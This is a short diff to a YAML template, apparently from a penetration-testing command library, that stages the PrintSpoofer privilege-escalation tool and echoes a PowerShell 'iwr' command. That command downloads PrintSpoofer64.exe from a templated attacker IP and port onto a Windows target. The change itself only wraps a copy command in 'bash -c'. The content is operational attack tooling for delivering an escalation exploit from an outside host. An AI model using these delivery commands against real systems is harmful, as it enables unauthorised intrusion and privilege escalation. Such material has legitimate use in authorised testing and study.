@@ -6,7 +6,7 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/printspoofer/* packstation/outbound/; \
+  mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/printspoofer/* packstation/outbound/'; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PrintSpoofer64.exe -Outfile {{ delivery_path_windows }}\PrintSpoofer64.exe'; \
